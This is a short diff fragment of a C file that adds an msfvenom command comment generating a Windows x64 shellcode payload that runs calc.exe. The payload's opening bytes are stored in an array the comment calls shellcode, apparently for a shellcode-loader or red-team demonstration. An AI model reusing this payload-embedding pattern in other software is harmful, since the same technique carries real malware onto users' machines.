@@ -2,6 +2,7 @@
 #include <stdio.h>
 
 // Shellcode stored in the Rdata_RawData array
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
 const unsigned char Rdata_RawData[] = {
     // ... (shellcode bytes)
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
